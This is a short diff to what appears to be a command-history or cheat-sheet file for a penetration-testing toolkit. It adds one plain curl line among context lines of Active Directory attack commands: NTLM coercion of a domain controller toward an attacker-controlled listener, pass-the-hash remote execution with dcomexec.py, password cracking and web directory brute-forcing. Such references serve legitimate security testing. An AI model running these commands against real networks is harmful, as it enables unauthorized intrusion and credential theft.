@@ -63,6 +63,7 @@ coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --listener "$ATTACKER_IP" --targe
 coercer -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --webdav-host 'machine_name' --target "$DC_HOST"
 crackhound.py --verbose --password 'exegol4thewin' --plain-text --plain-text --domain "$DOMAIN" --file ownedusers.txt --add-password
 curl --ntlm -u "$USER":"$PASSWORD" 127.0.0.1
+curl -# -l $URL
 dcomexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
 dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
 dirb http://192.168.10.10 /usr/share/seclists/Discovery/Web-Content/big.txt
